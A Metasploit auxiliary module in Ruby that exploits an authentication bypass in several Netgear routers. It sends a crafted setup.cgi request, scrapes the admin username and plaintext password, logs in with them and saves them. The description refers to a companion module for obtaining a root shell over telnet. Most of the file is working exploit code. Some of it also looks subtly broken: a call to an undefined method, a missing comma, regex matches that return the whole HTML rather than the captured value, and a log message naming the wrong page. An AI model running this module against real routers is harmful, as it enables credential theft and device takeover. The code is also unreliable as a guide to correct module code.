##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netgear PNPX_GetShareFolderList Authentication Bypass',
        'Description' => %q{
          This module targets an authentication bypass vulnerability in the mini_http binary of several Netgear Routers
          running firmware versions prior to 1.2.0.88, 1.0.1.80, 1.1.0.110, and 1.1.0.84. The vulnerability allows
          unauthenticated attackers to reveal the password for the admin user that is used to log into the
          router's administrative portal, in plaintext.

          Once the password has been been obtained, attackers can use the exploit/linux/telnet/netgear_telnetenable module
          to send a special packet to port 23/udp of the router to enable a telnet server on port 23/tcp. The attacker can
          then log into this telnet server using the new password, and obtain a shell as the "root" user.

          This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Unknown', # Vulnerability discovery and PoC creation.
          'Grant Willcox' # Metasploit Module
        ],
        'References' => [
          [ 'URL', 'https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133' ],
          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/' ]
        ],
        'Notes' => {
          'SideEffects' => [ CONFIG_CHANGES ],
          'Stability' => [ CRASH_SERVICE_DOWN ]
        },
        'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
        'DisclosureDate' => '2021-09-06',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(8080)
      ]
    )
  end

  def retrieve_firmware_version
    res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
    if res.nil?
      return Exploit::CheckCode::Unknown('Connection timed out.')
    end

    data = res.to_s
    firmware_version = data.match(/Firmware=V(\d+\.\d+\.\d+\.\d+)(_(\d+\.\d+\.\d+))?/)
    if firmware_version.nil?
      return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
    end

    firmware_version
  end

  def check
    target_version = retrieve_version
    print_status("Target is running firmware version #{target_version}")
    if (target_version >= Rex::Version.new('1.2.0.0')) && (target_version < Rex::Version.new('1.2.0.88'))
      return Exploit::CheckCode::Appears
    elsif (target_version >= Rex::Version.new('1.0.1.0')) && (target_version < Rex::Version.new('1.0.1.80'))
      return Exploit::CheckCode::Appears
    elsif (target_version >= Rex::Version.new('1.1.0.0')) && (target_version < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.
      return Exploit::CheckCode::Appears
    elsif (target_version >= Rex::Version.new('1.1.0.0')) && (target_version < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    res = send_request_cgi(
      'uri' => '/',
      'method' => 'GET'
    )
    unless res.headers['WWW-Authenticate'] =~ /Netgear/
      fail_with(Failure::NoTarget, 'Target does not appear to be a Netgear router!')
    end

    res = send_request_cgi(
      'uri' => '/setup.cgi'
      'vars_get' => {
        'next_file' => 'BRS_swisscom_success.html',
        'x' => 'todo=PNPX_GetShareFolderList',
      },
      'method' => 'GET'
    )

    unless %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)
      fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin username in its response!')
    end
    username = %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)[0]

    unless %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">New Admin password</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)
      fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin password in its response!')
    end
    password = %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">New Admin password</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)[0]

    if username.empty? || password.empty?
      fail_with(Failure::UnexpectedReply, 'Application responded with expected content, but the matched content was an empty string for some reason!')
    end

    print_good("Can log into target router using username #{username} and password #{password}")
    print_status('Attempting to retrieve /top.html to verify we are logged in!')

    res = send_request_cgi(
      'uri' => '/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList',
      'method' => 'GET',
      'authorization' => basic_auth(username, password)
    )

    unless %r{<div id="firm_version"><span languageCode = "[0-9]+">Firmware Version</span><br />([^\n]+)}.match(res.text)
      fail_with(Failure::UnexpectedReply, 'The target router did not respond with a firmware version when /top.html was requested. Are we logged in?')
    end

    print_good('Successfully logged into target router using the stolen credentials!')
    print_status('Storing credentials for future use...')

    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username
    }

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
